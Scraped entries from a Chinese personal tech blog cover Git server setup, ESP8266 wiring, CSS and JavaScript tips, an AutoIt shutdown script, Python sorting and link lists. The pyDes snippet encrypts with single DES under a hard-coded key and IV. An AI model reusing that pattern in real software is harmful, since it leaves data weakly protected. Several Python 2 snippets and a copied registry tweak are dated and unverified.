剪贴板增强软件综述:CLCL,ClipX,Ditto等（更新CLCL v2.0） | 善用佳软 https://xbeta.info/clipx-clcl-ditto.htm 2020-01-31 剪贴板增强软件综述:CLCL,ClipX,Ditto等（更新CLCL v2.0） – 善用佳软 最近想找美費能做順序粘貼（Incremental paste） 有看到幾個介紹使用測試 Clipboard Magic 找不到這個功能(說不定是我沒找到) 不知道是不是 Win 7 關係不太相容，所以程式用起來非常卡 Chocolatey Software | Clipjump 12.5 後來看到下面的人推薦使用 Clipjump 雖然沒有找到類似 clipmate 順序粘貼 但發現連續 Ctrl + C ，再貼上的時候 Ctrl+ V 時候，放掉V後Ctrl不要放掉再按V 這時候會有跳出提示是什麼字 這時候會發現只能下一步 貼錯要回去怎麼辦?? V改成C會往前貼之前的東西 這個就有類似順序粘貼功能 其實功能還滿多的，但缺乏 GUI 介面 所以可能第一次要摸了老半天才知道要怎麼用 ","date":"2016-09-11","objectID":"/blog/posts/logdown/2016-09-11-863647/:0:0","tags":null,"title":"好用的剪貼簿","uri":"/blog/posts/logdown/2016-09-11-863647/"},{"categories":["實用工具"],"content":"List AdvancedNewFile (新增檔案用) Alignment (對齊用) All Autocomplete (自動載入別的開的檔案tip) Bootstrap 3 Snippets BracketHighlighter (提示/修改/移除外框符號，算還實用) ConvertToUTF8 (還沒utf-8專案用) DocBlocker (註解用) Emmet (html專用) IMESupport (中文輸入法專用) jQuery PHP-Twig Pretty JSON (你的json會變很好看) SqlBeautifier (你的sql會變的很好看XD) StringEncode (html轉一些符號，很實用) Text Pastry (1 to x ，懶人專用，我很愛) ","date":"2016-08-23","objectID":"/blog/posts/logdown/2016-08-23-801285/:0:0","tags":null,"title":"我的Sublime Text 3套件分享","uri":"/blog/posts/logdown/2016-08-23-801285/"},{"categories":["Git"],"content":"最近公司接了一個案子，我被分配到架設Git Server工作 架設成功，就在這裡做簡單的筆記。 由於網路教的都大同小異，只需理解為什麼這樣做 用自己的需求，基本上實作應該都能做出來 首先，先建立git帳號 adduser git 然後，Git Server說穿了就是用ssh方式做存取 所以必需用RSA金鑰登入(不需打密碼這種)，多虧了這次我終於了解ssh金鑰登入方式 ssh-keygen -t rsa 家目錄就會產生了.ssh資料夾 裡面有id_rsa.pub id_rsa兩個檔案(前者是公開金鑰[給Server]、後者是私密金鑰[Clinet自己保留]) 在Server的git家目錄把.ssh\\authorized_keys加入公開金鑰 或 上傳公開金鑰直接用指令加入 cat /tmp/id_rsa.john.pub \u003e\u003e ~/.ssh/authorized_keys 注意：.ssh資料夾必需要為700，authorized_keys必需為600或root owner 此時可以進行ssh登入嘗式，能登入git帳號成功，就差不多了。 在家目錄建立 mkdir xxx.git cd xxx.git git --bare init 好了，接下來就做commit上去試試 $ cd myproject $ git init $ git add . $ git commit -m 'initial commit' $ git remote add origin git@xxx.xxx.xxx.xx:xxx.git $ git push origin master 完畢。 什麼，你說還沒完XD，由於安全性的問題 git應該不該登入帳號 sudo vim /etc/passwd git:x:1000:1000::/home/git:/usr/bin/git-shell 好了這樣就完成了。 你說還有https、Gitosis和GitLab 各位勇者就靠你們研究嘍XD 在這次實作，我發現可以用scp指令傳檔案上去 pietty 0.3可以傳(拖移檔案)，以後傳檔案不用在開ftp了(淚) 參考來源： 伺服器上的 Git - 架設伺服器 https://git-scm.com/book/zh-tw/v1/%E4%BC%BA%E6%9C%8D%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E6%9E%B6%E8%A8%AD%E4%BC%BA%E6%9C%8D%E5%99%A8 在 Linux 中架設 Git 伺服器教學（使用 SSH 加密傳輸） https://blog.gtwang.org/linux/linux-git-server-using-ssh/ 給windows使用者的簡易Git環境架設 (linux架設) http://eric0806.blogspot.tw/2014/05/ubuntu-git-server-for-small-team-who-use-windows-os.html Ubuntu架設GitServer http://samchu.logdown.com/posts/777348-set-up-ubuntu-gitserver CentOS架設GitServer http://samchu.logdown.com/posts/778052-set-up-centos-gitserver Fedora, CentOS ssh 登入到遠端 Server 不用密碼 http://linux988.pixnet.net/blog/post/25926301-fedora,-centos-ssh-%E7%99%BB%E5%85%A5%E5%88%B0%E9%81%A0%E7%AB%AF-server-%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A2%BC ","date":"2016-08-23","objectID":"/blog/posts/logdown/2016-08-23-in-linux-git-server-ssh/:0:0","tags":["git"],"title":"在Linux架Git Server(ssh)","uri":"/blog/posts/logdown/2016-08-23-in-linux-git-server-ssh/"},{"categories":["網站記錄"],"content":"http://plnkr.co/ http://codepen.io/ http://jsbin.com/ http://jsfiddle.net/ http://codemagic.gr/ http://www.cssdesk.com/ http://dabblet.com/ http://liveweave.com/ ","date":"2016-06-29","objectID":"/blog/posts/logdown/2016-06-29-online-web-page-editor/:0:0","tags":null,"title":"線上網頁編輯器","uri":"/blog/posts/logdown/2016-06-29-online-web-page-editor/"},{"categories":["JQuery"],"content":"由於同事有用我寫的JavaScript做tr跳頁監聽事件 由於第一欄是input radio不需做跳頁 我就簡單寫了 $('table tr').click(function(){ location.href='xxxxxx'; }); $('table tr:first-child').off('click'); 同事問我怎麼不用:first，怎麼使用:first-child 他說他改效果一樣 $('table tr:first').off('click'); 瞬間被考倒 我忘了他們的差別 當然馬上Google腦補一下 才發現他們不一樣…. :first只會select第一個 :first-child只會select每個父層的第一個子元素 :first-child等於:nth-child(1) 還有:first-of-type和:nth-of-type(1)還是有差 還有:nth-last-child(n) 有空在記一下筆記 備注:CSS沒有:first ","date":"2016-06-25","objectID":"/blog/posts/logdown/2016-06-25-css-first-and-first-child-not-the-same/:0:0","tags":null,"title":"[jQuery] :first 和:first-child 不一樣","uri":"/blog/posts/logdown/2016-06-25-css-first-and-first-child-not-the-same/"},{"categories":["Arduino"],"content":" 最近同事揪來 玩 學Arduino 由於之前忘記採購到WIFI模組 同事最近燒壞了WIFI模組(好像接到5v線) 最近借我了ESP8266和PL2303，叫我好好的玩 那我就大力的玩下去 當然我就簡單找網路上實作 前面參考教學Arduino WIFI(ESP8266) 初次上手應用 一開始接wifi接到TTL真的不習慣，好不容易照上面教學做完 花了一些時間，接上電腦上面…竟然找不到驅動 這之前我完全不知道那個USB是TTL又花了一些時間 囧 中間還滿想衝Webduino就不會有這些問題 有興趣的可以看一下這個Marty x Will @ 前端工程師的逆襲：使用 Web 技術玩轉 Arduino 開發版 用win7搜尋TTL驅動PL2303 驅動程式就看到 接下來就繼續教學Arduino WIFI(ESP8266) 初次上手應用 Realterm(終端機) CH_PD和VCC連在一起要接3v，不然接到5v會有燒掉的風險 照上面教學還是連不到，我就以為接錯線…. 馬上又重看才發現TXD\u003c—\u003eRXD要對接 所以就重新拔掉重接線 接線發現TTL變白燈(事後才發現這好像才是插錯線) 我興奮啦 感覺這次亮白燈應該就接對線了 但還是試了很久還是失敗orz 最後發現wifi沒有亮 我還以為是esp8266燒壞了 囧 最終爬掉在重接，TTL亮紅燈 wifi也有亮燈 就可以用了 如何燒錄 ESP8266 無線模組的韌體 ESP8266 更新韌體 才發現GPIO要接GNP才能進入燒寫模式(一直以為就跟手機刷機一樣XD) 還要燒四次 置於他說要額外接上電源，這樣電力才會夠 但我是用筆電就可以燒入成功 在網路爬文後，需要更新ESP8266韌體才能玩Arduino ESP8266 firmware 燒寫介紹 從上面官網可以看到ESP8266Flasher.exe軟體 燒韌體還是失敗 還要抓四個韌體更新也在這個網站裡的Google Driver 照著Google Driver文件設定為8MB 在設定Config 4個設定檔(其中一個一樣) 和 address 點Flash進行燒入，燒入的過程中看到有MAC就表示有成功 再設定Config把第一個關掉 再回去點Flash(重覆4次)就完成 開啟Realterm 鮑率打9600 最後要打115200 網路查了一下，舊版好像是9600，新版才是115200 要更新韌體才能用Arduino 但要手動改9600才能用 拍一下要設定的地方 OPEN是點掉再按下去 AT OK 感動 最後發現我常用的pietty也能連 打指令要用Enter後再按Ctrl+J 好像這個比較方便耶XD 下次用用Arduino連ESP8266 參考來源： http://ruten-proteus.blogspot.tw/2014/12/esp8266-firmware-burning.html http://lets-make-games.blogspot.tw/2015/04/wifi-esp8266-wifi.html https://mlwmlw.org/2015/07/%E6%B7%B1%E5%85%A5%E6%B7%BA%E5%87%BA-wifi-%E6%99%B6%E7%89%87-esp8266-with-arduino/ https://www.youtube.com/watch?v=bq71JX25DGg http://ruten-proteus.blogspot.tw/2014/12/esp8266-at-command.html http://flower-platform.com/2015/12/16/esp8266-with-at-commands-connect-from-pc-with-putty/ http://lets-make-games.blogspot.tw/2015/04/wifi-esp8266-wifi.html http://code.unumobile.com/wf8266r/tutorials/esp8266/00_FM http://www.prolific.com.tw/US/ShowProduct.aspx?p_id=225\u0026pcid=41 https://docs.google.com/viewer?a=v\u0026pid=sites\u0026srcid=a3N2cy5raC5lZHUudHd8dGpofGd4OjFiNWM2NGJjMjA4NmZlZjA https://github.com/nodemcu/nodemcu-flasher/tree/master/Win64/Release http://yhhuang1966.blogspot.tw/2015/08/esp8266.html ","date":"2016-06-24","objectID":"/blog/posts/logdown/2016-06-24-arduino-new-esp8266-and-usb-wifi-chip-ttl-serial-pl2303-connected-to-pc/:0:0","tags":["Arduino"],"title":"[Arduino]新手用 Wifi 晶片 ESP8266 和 USB TTL Serial(PL2303)接上PC","uri":"/blog/posts/logdown/2016-06-24-arduino-new-esp8266-and-usb-wifi-chip-ttl-serial-pl2303-connected-to-pc/"},{"categories":["CSS"],"content":"由於最近做一個報表系統，在測試環境下沒有很長的資料，報表表格都沒有什麼問題 但在正試環境，很多文字就有自動換行的問題，然後爬了文但不清楚這些東西 花了一個下午時間理解這些東西，順便記一下筆記，不然很久沒用應該就忘掉了 囧 word-break:normal|break-all|keep-all; word-wrap:normal|break-word 上面都是解決換行的問題(但不是真的換行) ","date":"2016-06-19","objectID":"/blog/posts/logdown/2016-06-19-css-word-wrap-problems/:0:0","tags":["word-break","word-wrap"],"title":"[CSS]文字換行的問題","uri":"/blog/posts/logdown/2016-06-19-css-word-wrap-problems/"},{"categories":["CSS"],"content":"word-break:Normal normal下一句有單字超過邊距會把整個單字換下一行 ","date":"2016-06-19","objectID":"/blog/posts/logdown/2016-06-19-css-word-wrap-problems/:1:0","tags":["word-break","word-wrap"],"title":"[CSS]文字換行的問題","uri":"/blog/posts/logdown/2016-06-19-css-word-wrap-problems/"},{"categories":["CSS"],"content":"word-break:keep-all; 恩，結果好像跟Normal模式一樣，沒什麼差別…，但這樣就特錯大錯 查了一下文件如下 normal Use the default line break rule. break-all Word breaks may be inserted between any character for non-CJK (Chinese/Japanese/Korean) text. keep-all Don't allow word breaks for CJK text. Non-CJK text behavior is the same as for normal. http://devdocs.io/css/word-break 官網下面範例就很清楚keep-all英文下還是以normal，但非英文(中文、日文…)不會換行 這邊我把他想像成 會把一串中文變成一整個單字，所以換行 剛發現中文與中文之間有空白還是會做換行動作 好了，接下來要講word-break:break-all; ","date":"2016-06-19","objectID":"/blog/posts/logdown/2016-06-19-css-word-wrap-problems/:2:0","tags":["word-break","word-wrap"],"title":"[CSS]文字換行的問題","uri":"/blog/posts/logdown/2016-06-19-css-word-wrap-problems/"},{"categories":["CSS"],"content":"word-break:break-all white-space:nowrap; 一段不會換行的問題 我的table不會亂用word-break:keep-all;或white-space:nowrap;可以解決問題 測試還發現display:block裡面文字超出去 但是外框大小不會跟著文字延伸 display:inline-block就沒有這個問題 上面的div文字會超出去邊框，但table沒有這個問題 看來有空要搞清楚這些…. ","date":"2016-06-19","objectID":"/blog/posts/logdown/2016-06-19-css-word-wrap-problems/:3:0","tags":["word-break","word-wrap"],"title":"[CSS]文字換行的問題","uri":"/blog/posts/logdown/2016-06-19-css-word-wrap-problems/"},{"categories":["JavaScript"],"content":"最近有使用JavaScript Date物件，想說有什麼辦法直接把變數換成當月最後一天 發現網路上有一個教法寫 var date = new Date(); date.setMonth(date.getMonth+1); date.setDate(0); console.log(date); 非常神奇，簡單又不需要判斷閏年的問題!!!! 由於同學最近問我有沒有辦法固定網頁的時間先自動調整 我就簡單看一下，在瀏覽器的GreaseMonkey的腳本來寫JavaScript 就用了一下Date物件 var input = jQuery('\u003cinput value=\"06\"\u003e').change(function(){ var inputMonth = jQuery(this).val(); if(inputMonth.length == 1) inputMonth = '0'+ inputMonth; var setDate = new Date(2016,inputMonth,1); setDate.setMonth(setDate.getMonth()); setDate.setDate(0); var day = setDate.getDate(); jQuery('[name=**a**]').val('2016-' + inputMonth + '-01 00:00'); jQuery('[name=**b**]').val('2016-' + inputMonth + '-' + day + ' 23:59'); }).change(); jQuery('#**a**').before(input); 順便也把他覺得麻煩的readonly拿掉了XD 他以後橫行無阻(誤) 這個感覺還滿實用的，先簡單記個筆記 怕太久沒用就忘了XD 為什麼setDate(0)是抓前一個月最後一天呢?? 我有試著查看MDN的文件，但好像沒特別說setDate(0) 只看到setDate(32)會是下個月1日，然後又看不太懂ECMASCRIPT文件 最後有在w3cschool看到 Required. An integer representing the day of a month. Expected values are 1-31, but other values are allowed: 0 will result in the last day of the previous month -1 will result in the day before the last day of the previous month If the month has 31 days: 32 will result in the first day of the next month If the month has 30 days: 32 will result in the second day of the next month 比較注意的是呼叫date物件new Date(year,month-1,day)，一月month參數為0 參考來源： http://www.w3schools.com/jsref/jsref_setdate.asp http://www.eion.com.tw/Blogger/?Pid=1148 看到有趣應用 http://stackoverflow.com/questions/13745742/setdate-to-the-date-whose-day-is-zero-that-is-sunday http://jsfiddle.net/phZr7/1/ ","date":"2016-06-12","objectID":"/blog/posts/logdown/2016-06-12-javascript-simple-date-object-record/:0:0","tags":["JavaScript","Date"],"title":"[JavaScript] Date物件  小筆記","uri":"/blog/posts/logdown/2016-06-12-javascript-simple-date-object-record/"},{"categories":["AutoIt"],"content":"就公文開啟腳本加上禮拜六日自動關機程式，不要浪費學校的電 然後怕卡在國定假日要來上課，所以寫出這個角本 自動開機就在BIOS設定，就搞定了XD #include \u003cDate.au3\u003e Func OpenProc() #Working code EndFunc If @WDAY==1 or @WDAY == 7 Then run(\"shutdown -s -f -t 600\") sleep(5) $goSutdown = MsgBox($MB_OKCANCEL,@WDAY,\"今天是周休假日，程式自動執行關機，請問你是否繼續執行關機？\") If $goSutdown = $IDCANCEL Then run(\"shutdown -a\") OpenProc() EndIf exit(1) EndIf OpenProc() ","date":"2015-06-22","objectID":"/blog/posts/logdown/2015-06-22-autoit-asked-the-week-6th-automated-shutdown-script/:0:0","tags":["AutoIt","自動化"],"title":"[Autoit]詢問禮拜六日自動關機腳本","uri":"/blog/posts/logdown/2015-06-22-autoit-asked-the-week-6th-automated-shutdown-script/"},{"categories":["Python"],"content":"之前網路上看到if 和for一行寫法 今天Google找了一下，發現找不到東西 KeyWord:if for one line | if for one statement 最後在Python3文件找到Expressions Conditional Expressions有點像ternary operator print(\"True\" if True else False) 以前常見的ternary operator echo \"True\" ? True:False Generator expressions ","date":"2015-05-04","objectID":"/blog/posts/logdown/2015-05-04-python-conditional-expressions-and-generator-expressions/:0:0","tags":null,"title":"[Python]Conditional expressions和Generator expressions","uri":"/blog/posts/logdown/2015-05-04-python-conditional-expressions-and-generator-expressions/"},{"categories":["Python"],"content":"最近突然想到以前有在網路看到Dict做排序 覺得這些以後還用的到 所以記錄一下… #http://www.saltycrane.com/blog/2007/09/how-to-sort-python-dictionary-by-keys/ for key in sorted(mydict.iterkeys()): print \"%s: %s\" % (key, mydict[key]) for key, value in sorted(mydict.iteritems(), key=lambda (k,v): (v,k)): print \"%s: %s\" % (key, value) 寫成現有method #http://code.activestate.com/recipes/52306-to-sort-a-dictionary/ # (IMHO) the simplest approach: def sortedDictValues1(adict): items = adict.items() items.sort() return [value for key, value in items] # an alternative implementation, which # happens to run a bit faster for large # dictionaries on my machine: def sortedDictValues2(adict): keys = adict.keys() keys.sort() return [dict[key] for key in keys] # a further slight speed-up on my box # is to map a bound-method: def sortedDictValues3(adict): keys = adict.keys() keys.sort() return map(adict.get, keys) #http://falldog7.blogspot.com/2009/10/python-dictionary-or-classitemlistsort.html d= [ {'id':0, 'value':9}, {'id':1, 'value':100}, {'id':5, 'value':99}, {'id':3, 'value':19}, {'id':2, 'value':59} ] d.sort(key=lambda x:x['id']) #針對key 'id' 做sort d.sort(key=lambda x:x['value']) #針對key 'value' 做sort #以下用cmp，可以達到上面指定key的效果 d.sort(cmp=lambda x,y: cmp(x['id'], y['id'])) d.sort(cmp=lambda x,y: cmp(x['value'], y['value'])) class data: def __init__(self, _id, _value): self.id = _id self.value = _value c = [ data(0,9), data(1,100), data(5,99), data(3,19), data(2,59) ] c.sort(key=lambda x:x.id)#針對class member id 做sort c.sort(key=lambda x:x.value)#針對class member value 做sort #以下用cmp，可以達到上面指定key的效果 c.sort(cmp=lambda x,y: cmp(x.id, y.id) ) c.sort(cmp=lambda x,y: cmp(x.value, y.value)) 資料來源：http://www.dotblogs.com.tw/rickyteng/archive/2011/12/29/63734.aspx ","date":"2015-05-04","objectID":"/blog/posts/logdown/2015-05-04-pythondict-sort-records/:0:0","tags":null,"title":"[Python]dict排序筆記","uri":"/blog/posts/logdown/2015-05-04-pythondict-sort-records/"},{"categories":["Python"],"content":"http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html ","date":"2015-04-26","objectID":"/blog/posts/logdown/2015-04-26-python-the-normalised-complie-usage/:0:0","tags":null,"title":"[Python]正規化complie用法","uri":"/blog/posts/logdown/2015-04-26-python-the-normalised-complie-usage/"},{"categories":["Python"],"content":"pyDes Github from pyDes import * import base64 import time import random data =str(random.random())+\"|\"+\"加密內容\" k = des('DESCRYPT', CBC, '12345675', pad=None, padmode=PAD_PKCS5) d = k.encrypt(data) print \"Encrypted: %r\" % base64.b64encode(d) print \"Decrypted: %r\" % k.decrypt(d) ","date":"2015-04-26","objectID":"/blog/posts/logdown/2015-04-26-python-use-pydespy-encryption-and-decryption/:0:0","tags":null,"title":"[Python]使用pyDes.py動態加密解密","uri":"/blog/posts/logdown/2015-04-26-python-use-pydespy-encryption-and-decryption/"},{"categories":["Windows"],"content":"最近同學幫別人灌電腦遇到Win7裡的Office會有閃爍的問題 結果Google一下，還真的可以解決!!! 記錄一下，說不定哪天就用到了 一些 電腦優化程序 可能會把 電腦的關閉( Shutdown?? )速度 增加 ， Win7 的視窗閃動、間歇地出現\"沒有回應\" ( 並非螢幕黑屏 ) 問題多數是由這所引起的 。 解 : 1 按左下角的\"開始\"，輸入 \"regedit\" ，開 \"regedit.exe\"， 程式的左方應包含一 \"資料夾選巴\"。 2 在選巴中選 \" HKEY_USERS \\ .DEFAULT \\ Control Panel \\ Desktop \"， 程式的右方應出現一些 \"登錄值\" ，包含 名稱、類型、資料 等。 3 在 \"登錄值\" 中選取 \" HungAppTimeOut \" 和 \" WaitToKillAppTimeOut \"，點右鍵刪除。 4 在選巴中選 \" HKEY_CURRENT_USER \\ Control Panel \\ Desktop \"。 5 在 \"登錄值\" 中選取 \" HungAppTimeOut \"、\" WaitToKillAppTimeOut \"、\" WaitToKillServiceTimeOut \"，點右鍵刪除。 略解 : 1 開 登錄編輯程式( Registry Editor ) 。 2 刪除 \" HKEY_USERS \\ .DEFAULT \\ Control Panel \\ Desktop \" 中的 (\" HungAppTimeOut \"、\" WaitToKillAppTimeOut \")。 3 刪除 \" HKEY_CURRENT_USER \\ Control Panel \\ Desktop \" 中的 (\" HungAppTimeOut \"、\" WaitToKillAppTimeOut \"、\" WaitToKillServiceTimeOut \")。 若發現此解適用於其它作業系統 ，請下報。 參自 : www.mydigitallife.info 參考來源： Windows7 視窗、畫面、遊戲程式 閃動問題 解決辦法 https://groups.google.com/forum/#!topic/computer_resuce/rDn_21bC2Lk ","date":"2015-03-07","objectID":"/blog/posts/logdown/2015-03-07-win7-is-window-flashing-intermittent-appear-not-responding/:0:0","tags":["視窗閃動"],"title":"Win7 的視窗閃動、間歇地出現\"沒有回應\" ","uri":"/blog/posts/logdown/2015-03-07-win7-is-window-flashing-intermittent-appear-not-responding/"},{"categories":["Windows"],"content":"今天幫主任重灌筆電，由於是用我同學整合的Win7安裝 發現驅動抓到無線網卡，但無線網卡沒法找無線Wifi 1.點擊開始菜單，在搜索欄中輸入「services.msc」（輸入時不要打引號），並按下回車。如果此時彈出用戶賬戶控制窗口，請您點擊「繼續」。 2.分別按順序雙擊打開\"CNG Key Isolation\" \"Extensible Authentication Protocol\" \"WLAN AutoConfig\"服務。點擊「常規」選項卡，確保「啟動類型」是「自動」或者「手動」。然後點擊「服務狀態」下面的「啟用」按鈕。 或者手動啟動三個服務 1. \"CNG Key Isolation\" 2. \"Extensible Authentication Protocol\" 3. \"WLAN AutoConfig\" http://rossic0989.pixnet.net/blog/post/29726514-%E7%84%A1%E6%B3%95%E5%95%9F%E5%8B%95wlan-autoconfig%E9%8C%AF%E8%AA%A4%E4%BB%A3%E7%A2%BC1068%28win7%29 結果是我同學Win7整合服務關掉orz 讓我搞這麼久 ","date":"2015-01-26","objectID":"/blog/posts/logdown/2015-01-26-wifi-caught-driving-but-not-even-wifi/:0:0","tags":["wifi","驅動","不能連wifi"],"title":"wifi抓到驅動但不能連wifi","uri":"/blog/posts/logdown/2015-01-26-wifi-caught-driving-but-not-even-wifi/"},{"categories":["網站記錄"],"content":"←2014隨意筆記紀錄 新的一年…新的開始。 201501 之前2014年看到的滾動適窗skrollr.js，最近又看到幾個 http://blog.friendo.com.tw/posts/240944-prallax-scrolling-by-skrollr scrollReveal.js http://scrollrevealjs.org/ anijs https://github.com/anijs/examples/tree/gh-pages/scrollreveal http://anijs.github.io/ http://anijs.github.io/examples/scrollreveal/ [譯]為什麼我們找不到前端工程師？ https://zh-tw.facebook.com/notes/lock-chou/%E8%AD%AF%E7%82%BA%E4%BB%80%E9%BA%BC%E6%88%91%E5%80%91%E6%89%BE%E4%B8%8D%E5%88%B0%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%AB/10152095506555563 Rightjs http://rightjs.org/ 學習 JavaScript https://developer.mozilla.org/zh-TW/learn/javascript jQuery Cookie 使用注意事項 http://jocoomadao.logdown.com/posts/249883-jquery-cookie-usage-considerations 難搞的 windows 系統 安裝 sass 篇 http://jamestw.logdown.com/posts/250160-difficult-sass-installed-windows-system-article Lumx http://ui.lumapps.com/ AngularjsHub http://www.angularjshub.com/ Python-split (第二參數) http://kevingo.logdown.com/posts/251938-pythons-split 前進 RWD Grid 設計 - 談Photoshop CS5 網格設計擴充 http://adon988.logdown.com/posts/251966-rwd-grid-design-on-the-fence-design-ready-to-what [jQuery]使用jQuery對 select 的操作 http://www.dotblogs.com.tw/alanjiang/archive/2011/01/26/21061.aspx 給 Gradle 入門者的 Groovy 語言特性介紹 http://cloudchen.logdown.com/posts/248361/features-of-groovy-for-gradle-beginner 爬蟲服務也上雲端，Kimono讓所有網站都API化 http://www.ithome.com.tw/news/93694 用「Kimono」製作自己的網路爬蟲！ http://typecurry.pixnet.net/blog/post/30665638 Json Web Crawler: 簡化寫爬蟲的 code http://knovourland.logdown.com/posts/252329-json-web-crawler ","date":"2015-01-05","objectID":"/blog/posts/logdown/2015-01-05-2015-random-notes/:0:0","tags":null,"title":"2015 隨意筆記紀錄","uri":"/blog/posts/logdown/2015-01-05-2015-random-notes/"},{"categories":["網站記錄"],"content":"201502 [CSS]利用CSS製作簡單Tooltip效果 http://monkeybinbin-blog.logdown.com/posts/253999-css-use-css-to-create-a-simple-tooltip-effect [JS]Websocket with PHP Socket http://penyin.logdown.com/posts/253523 WebSocket 簡單介紹與 jQuery 實作應用 (手機與電腦結合運用) http://blog.mukispace.com/websocket-simple-introduce-and-use/ GIT http://baleezo.logdown.com/posts/253386 Modernizr.js 判斷是否支援HTML 5功能 http://wd-blog.logdown.com/posts/254018-modernizrjs-to-determine-whether-to-support-html-5-features yepnope.js – 異步加載資源文件 http://wd-blog.logdown.com/posts/254016-yepnopejs-asynchronous-loading-of-resources-files head.js 讓網站並行加載但順序執行JS http://wd-blog.logdown.com/posts/254015-headjs-website-of-parallel-loads-but-the-order-executes-js html5up 網頁樣版網站 http://html5up.net 工作必備七萬 clip art 小插圖！最大美工圖庫免費下載 http://www.playpcesor.com/2015/02/clip-art-free-download.html Scrollex http://n33.co/scrollex Scrolly: a simple jQuery parallax plugin http://lab.victorcoulon.fr/javascript/scrolly/ Another 20 Docs and Guides for Front-End Developers http://www.sitepoint.com/another-20-docs-guides-front-end-developers/ OOCSS——概念篇 ※ http://www.w3cplus.com/css/oocss-concept ","date":"2015-01-05","objectID":"/blog/posts/logdown/2015-01-05-2015-random-notes/:1:0","tags":null,"title":"2015 隨意筆記紀錄","uri":"/blog/posts/logdown/2015-01-05-2015-random-notes/"},{"categories":["網站記錄"],"content":"201503 How to: CSS Large Background http://webdesignerwall.com/tutorials/how-to-css-large-background 技能樹 https://raw.githubusercontent.com/justjavac/awesome-awesomeness-zh_CN/master/assets/php-mind-map.jpg 在Python中如何Async的方式呼叫外部程式 http://blog.codylab.com/python-creationflags/ Windows 7 使用指令讓它預約關機! http://dreamtails.pixnet.net/blog/post/26178309 Stylify Me http://stylifyme.com/ Python2和Python3解惑 http://lovelock-blog.logdown.com/posts/257482-python2-and-python3-faq Font Awesome http://fortawesome.github.io/Font-Awesome/ http://lsinyi-blog.logdown.com/posts/257480-font-awesome-icon-with-css-using-teaching catfan.me Qatrix(輕量級高性能 JavaScript 框架 ) http://qatrix.com/ Medoo (PHP SQL 數據庫框架) http://medoo.in/ 用 data-* 屬性做出純 CSS 的 tooltip http://blog.mukispace.com/pure-css-tooltip-data-tag/ [CSS] 圓形圖片（更高的可自訂性） http://shinychang.net/article/53c3f1ff80e3f8c73200c0f7 程式碼準則 by @mdo http://juanitofatas.com/code-guide/ coServ(node.js實作精簡的 web serve) http://www.coservjs.org/coserv/manage?_loc=zh 10步掌握CSS定位: position static relative absolute float http://www.see-design.com.tw/i/css_position.html Scripting .NET Applications with IronPython http://www.codeproject.com/Articles/602112/Scripting-NET-Applications-with-IronPython C#调用Python脚本并使用Python的第三方模块 http://zh.5long.me/2015/dotnet-call-python/ Alternative to execfile in Python 3.2+? http://stackoverflow.com/questions/6357361/alternative-to-execfile-in-python-3-2 [Tool]Sublime Text 3安裝相關資紀錄(for Windows) http://monkeybinbin-blog.logdown.com/posts/258838-tool-sublime-text-3-installation-related-funding-record terrarium http://www.terrariumapp.com/ ","date":"2015-01-05","objectID":"/blog/posts/logdown/2015-01-05-2015-random-notes/:2:0","tags":null,"title":"2015 隨意筆記紀錄","uri":"/blog/posts/logdown/2015-01-05-2015-random-notes/"},{"categories":["網站記錄"],"content":"201504 [jQuery] 倒數計時(還有X天X時X分X秒) http://blog.patw.me/archives/198/jquery-countdown-as-well-as-x-x-x-minutes-x-seconds/ jQuery Timer Plugin http://darkk6.blogspot.tw/2012/06/jquery-timer-plugin.html CSS Diner http://flukeout.github.io/ CSS Diner 攻略 (其實不只一種答案) http://railsfun.tw/t/css-diner/63 python dict按照value 排序 http://hi.baidu.com/jackleehit/item/348a312f4c4c68f051fd876e Javascript - Bubbling V.S Capturing http://mrjumpy-blog.logdown.com/posts/259761-javascript-event-bubbling-vs-event-capturing http://codepen.io/jakealbaugh/full/PwLXXP 想學程式設計，你怎麼能錯過這 31 個學 Coding 的網站 http://buzzorange.com/techorange/2014/03/27/best-resources-to-learn-code/ Javascript 日期處理 http://jerry80409.logdown.com/posts/259925 Python Tutorial 第二堂（3）函式、模組、類別與套件 http://www.codedata.com.tw/python/python-tutorial-the-2nd-class-3-function-module-class-package/ 製作免安裝程式 Cameyo http://blog.joaoko.net/archives/3533 VMware Thinapp http://defeatshame.blogspot.com/2010/12/vmware-thinapp-office-2010.html SQL injection duplicate error http://vancelin.logdown.com/posts/260140-sql-injection-duplicate-error Django Girls 教學手冊 http://djangogirlstaipei.herokuapp.com/tutorials/?hc_location=ufi Fiddler(查看HTTP封包內容) http://blogs.telerik.com/fiddler/posts/15-03-30/what-s-new-in-fiddler-4-5 透過 Google Maps API 處理 GeoJSON 資料 http://kuro.tw/posts/2015/04/28/through-the-google-maps-api-geojson-data 淺談 Google map Heat map API http://kuro.tw/posts/2015/04/29/a-brief-talk-on-google-map-heat-map-api [note] jQuery 與 d3.js 的一些不同之處 http://kuro.tw/posts/2015/04/22/note-jquery-and-d3js-some-of-these-differences ","date":"2015-01-05","objectID":"/blog/posts/logdown/2015-01-05-2015-random-notes/:3:0","tags":null,"title":"2015 隨意筆記紀錄","uri":"/blog/posts/logdown/2015-01-05-2015-random-notes/"},{"categories":["網站記錄"],"content":"201505 ready4rails4 http://www.ready4rails4.net/ Python 遞迴處理路徑下檔案與資料夾 http://coder.aqualuna.me/2012/01/python.html Python tips: 什么是*args和**kwargs？ http://www.cnblogs.com/fengmk2/archive/2008/04/21/1163766.html 推薦五個熱門 Google 材質設計框架 (Material Design Framework) http://adon988.logdown.com/posts/263691-recommend-some-good-google-material-design-framework namedtuple https://docs.python.org/3/library/collections.html#collections.namedtuple 更好的編寫Python代碼的方式 http://cheng.logdown.com/posts/2015/04/24/better-way-to-write-python 網頁工程師必知：9 個超好用的 CSS 框架 http://buzzorange.com/techorange/2015/05/13/9-css-framework/ 快看過來～推薦你 9 個最好用的 JavaScript 開發工具 http://buzzorange.com/techorange/2015/03/03/9-javascript-ide-editor/ Bootstrap 免費的theme http://startbootstrap.com #繼2015/04 Fiddler，找到類似查看HTTP封包程式 LivePool http://code.csdn.net/news/2820655 https://github.com/rehorn/livepool Rythem http://www.alloyteam.com/2012/05/web-front-end-tool-rythem-1/ Global and Local Variables (Python2) http://www.python-course.eu/global_vs_local_variables.php Python 慣用語 http://seanlin.logdown.com/posts/239883-python-idioms Python之排列组合 http://love67.net/2014/02/09/python-sord-combine/ Cycle through list starting at a certain element [cycle list] http://stackoverflow.com/questions/8940737/cycle-through-list-starting-at-a-certain-element Python之排列组合 